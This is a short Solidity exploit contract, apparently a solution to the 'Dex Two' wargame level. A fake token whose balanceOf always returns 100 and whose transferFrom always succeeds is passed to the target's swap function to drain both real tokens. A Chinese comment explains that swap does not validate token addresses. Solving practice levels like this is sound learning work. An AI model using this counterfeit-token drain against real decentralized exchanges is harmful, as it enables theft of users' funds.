// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "hardhat/console.sol";

interface ILevel{
  function swap(address from, address to, uint amount) external;
}

contract DexTwoRun{

  function balanceOf(address) external pure returns (uint){
    return 100;
  }

  function transferFrom(address,address,uint256) public virtual returns (bool) {
    return true;
  }

  function run(address _runAddress,address _token1,address _token2) external {
    //swap没有检测from和to的地址是否合法，所以可以传自己，然后在balanceOf/transferFrom方法里作假
    ILevel(_runAddress).swap(address(this), _token1, 100);    
    ILevel(_runAddress).swap(address(this), _token2, 100);    
  }

}